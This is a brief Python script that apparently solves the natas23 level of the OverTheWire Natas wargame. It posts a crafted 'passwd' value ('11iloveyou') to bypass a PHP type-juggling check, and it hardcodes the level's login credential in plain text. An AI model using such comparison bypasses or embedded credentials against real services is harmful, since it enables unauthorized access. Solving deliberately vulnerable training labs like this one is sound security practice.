import requests

username = "natas23"
password = "D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE"

session = requests.Session()

url = "http://{}.natas.labs.overthewire.org/".format(username)

response = session.post(
    url, data={"passwd": "11iloveyou"}, auth=(username, password))
content = response.text
print(content)
